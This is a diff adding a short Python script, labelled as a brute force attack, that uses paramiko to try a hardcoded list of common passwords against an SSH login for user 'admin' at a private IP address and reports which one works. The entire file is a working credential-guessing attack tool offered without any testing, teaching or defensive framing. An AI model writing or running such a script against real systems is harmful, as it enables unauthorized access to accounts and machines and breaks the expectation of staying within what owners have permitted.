@@ -1,0 +1,17 @@
+# Brute force attack script for SSH login using paramiko
+import paramiko
+
+target_ip = '192.168.1.1'
+username = 'admin'
+password_list = ['123456', 'password', 'admin123']
+
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+for password in password_list:
+    try:
+        ssh.connect(target_ip, username=username, password=password)
+        print(f"Login successful: {password}")
+        break
+    except paramiko.AuthenticationException:
+        print(f"Failed password: {password}")
